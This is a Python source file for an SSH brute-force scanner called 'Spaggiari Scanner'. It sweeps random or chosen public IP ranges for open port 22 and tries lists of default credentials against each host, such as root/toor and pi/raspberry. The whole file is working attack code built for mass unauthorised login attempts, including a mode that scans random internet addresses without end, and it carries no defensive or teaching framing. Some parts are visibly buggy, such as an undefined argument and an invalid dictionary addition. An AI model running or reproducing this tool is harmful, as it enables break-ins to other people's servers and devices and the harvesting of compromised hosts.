#!/usr/bin/env python
# Spaggiari Scanner - Developed by acidvegas in Python (https://acid.vegas/spaggiari)

import argparse
import logging
import os
import random
import re
import socket
import sys
import threading
import time
from collections import OrderedDict

# Throttle Settings
max_threads     = 100
throttle        = 20
timeout_breaker = 5
timeout_port    = 10
timeout_ssh     = 10

# SSH Login Combos
combos = OrderedDict([
    ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
])

deep_combos = OrderedDict([
    ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
    ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
    ('alien',     'alien'),
    ('bitnami',   'bitnami'),
    ('cisco',     'cisco'),
    ('device',    'apc'),
    ('dpn',       'changeme'),
    ('HPSupport', 'badg3r5'),
    ('lp',        'lp'),
    ('master',    'themaster01'),
    ('osmc',      'osmc'),
    ('pi',        'raspberry'),
    ('plexuser',  'rasplex'),
    ('sysadmin',  'PASS'),
    ('toor',      'logapp'),
    ('ubnt',      'ubnt'),
    ('user',      ('acme','live')),
    ('vagrant',   'vagrant'),
    ('virl',      'VIRL'),
    ('vyos',      'vyos')
])

# Excluded IP Ranges
reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')

def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_port)
    try:
        code = sock.connect((ip, port))
    except socket.error:
        return False
    else:
        if not code:
            return True
        else:
            return False
    finally:
        sock.close()

def check_range(targets):
    found = False
    for ip in targets:
        if found:
            break
        for bad_range in reserved:
            if ip.startswith(bad_range + '.'):
                found = True
                break
    return found

def ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split('.')))
    end   = list(map(int, end_ip.split('.')))
    temp  = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
           if temp[i] == 256:
              temp[i] = 0
              temp[i-1] += 1
        ip_range.append('.'.join(map(str, temp)))
    random.shuffle(ip_range)
    return ip_range

def random_int(min, max):
    return random.randint(min, max)

def random_ip():
    return '{0}.{1}.{2}.{3}'.format(random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))

def random_scan():
    while True:
        ip = (random_ip(),)
        if not check_range(ip):
            threading.Thread(target=ssh_bruteforce, args=(ip[0],)).start()
        while threading.activeCount() >= max_threads:
            time.sleep(1)

def range_scan(ip_range):
    for ip in ip_range:
        threading.Thread(target=ssh_bruteforce, args=(ip,)).start()
        while threading.activeCount() >= max_threads:
            time.sleep(1)
    while threading.activeCount() >= 2:
        time.sleep(1)

def ssh_bruteforce(ip):
    timeouts = 0
    if check_port(ip, 22):
        logging.debug('{0} has port 22 open.'.format(ip))
        for username in combos:
            passwords = combos[username]
            for password in combos[username]:
                if timeouts >= timeout_breaker:
                    break
                else:
                    result = ssh_connect(ip, username, password)
                    if result == 1:
                        timeouts += 1
                    elif result == 2:
                        timeouts = timeout_breaker
                    time.sleep(throttle)
    else:
        logging.error('{0} does not have port 22 open.'.format(ip))

def ssh_connect(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
    except socket.timeout:
        logging.error('Failed to connect to {0} using {1}:{2} (Timeout)'.format(hostname, username, password))
        return 1
    except Exception as ex:
        logging.error('Failed to connect to {0} using {1}:{2} ({3})'.format(hostname, username, password, str(ex)))
        return 0
    else:
        logging.info('Successful connection to {0} using {1}:{2}'.format(hostname, username, password))
        return 2
    finally:
        ssh.close()

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('Spaggiari Scanner'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python'.center(54)))
print('#{0}#'.format('https://git.supernets.org/acidvegas/spaggiari'.center(54)))
print('#{0}#'.format(''.center(54)))
logger = logging.getLogger()
logger.setLevel(logging.INFO)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s | %(levelname)8s: %(message)s', '%I:%M:%S')
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)
if not sys.version_info.major == 3:
    logging.critical('Spaggiari Scanner requires Python version 3 to run!')
    sys.exit()
try:
    import paramiko
except ImportError:
    logging.critical('Failed to import the Paramiko library!')
    sys.exit()
else:
    paramiko.util.log_to_file(os.devnull)
parser = argparse.ArgumentParser(prog='spaggiari.py', usage='%(prog)s [OPTIONS] [SCAN]')
parser.add_argument('-d', action='store_true', dest='deepscan', help='option: enable deep scanning.')
parser.add_argument('-f', action='store_true', dest='fastscan', help='option: enable fast scanning.')
parser.add_argument('-o', dest='output', help='option: save output from scan(s) to file.', metavar='<path>', type=str)
parser.add_argument('-l', dest='listscan', help='scan a list of ip addresses from file.', metavar='<path>', type=str)
parser.add_argument('-x', action='store_true', dest='randscan', help='scan random ip addresses. (does not stop)')
parser.add_argument('-r', dest='rangescan', help='scan a range of ip addresses.', metavar=('<class>', '<range>'), nargs=2, type=str)
parser.add_argument('-t', dest='targetscan', help='scan a target ip address.', metavar='<ip>', type=str)
args = parser.parse_args()
if args.deepscan:
    if not args.targetscan:
        logging.critical('Deep scanning can only be enabled with a target scan. (-t)')
        sys.exit()
    elif args.fastscan:
        logging.critical('Fast scanning can not be enabled with a deep scan. (-f)')
        sys.exit()
    else:
        combos = combos + deep_combos
elif args.fastscan:
    if args.targetscan:
        logging.critical('Fast scanning can not be enabled with a target scan.')
    combos = {'root':('root',) }
if args.output:
    file_handler = logging.FileHandler(args.output)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    logger.debug('Logging enabled.')
if args.listscan:
    if os.path.isfile(args.listscan):
        targets = []
        with open(args.listscan) as list_file:
            lines = list_file.read().splitlines()
            for line in [x for x in lines if x]:
                if check_ip(line):
                    targets.append(line)
        if targets:
            if not check_range(targets):
                logging.debug('Scanning {0:,} IP addresses from list...'.format(len(targets)))
                range_scan(targets)
                logging.debug('Scan has completed.')
            else:
                logging.error('Reserved IP address in range.')
        else:
            logging.error('List contains no valid IP addresses.')
    else:
        logging.error('Invalid list file. ({0})'.format(args.listscan))
elif args.randscan:
    logging.debug('Scanning random IP addresses...')
    random_scan()
elif args.rangescan:
    if args.rangescan[0] in ('b','c'):
        if args.rangescan[0] == 'b':
            if args.iprange == 'random':
                range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
            else:
                range_prefix = args.rangescan[1]
            start = range_prefix + '.0.0'
            end   = range_prefix + '.255.255'
        elif args.rangescan[0] == 'c':
            if args.iprange == 'random':
                range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
            else:
                range_prefix = args.rangescan[1]
            start = range_prefix + '.0'
            end   = range_prefix + '.255'
        if check_ip(start):
            targets = ip_range(start, end)
            if not check_range(targets):
                logging.debug('Scanning {0} IP addresses in range...'.format(len(targets)))
                range_scan(targets)
                logging.debug('Scan has completed.')
            else:
                logging.error('Reserved IP address in range.')
        else:
            logging.error('Invalid IP range prefix. ({0})'.format(args.rangescan[1]))
    else:
        logging.error('Invalid IP Class. ({0})'.format(args.rangescan[0]))
elif args.targetscan:
    if check_ip(args.targetscan):
        ssh_bruteforce(args.targetscan)
        logging.debug('Scan has completed.')
    else:
        logging.error('Invalid IP Address. ({0})'.format(args.targetscan))
else:
    parser.print_help()
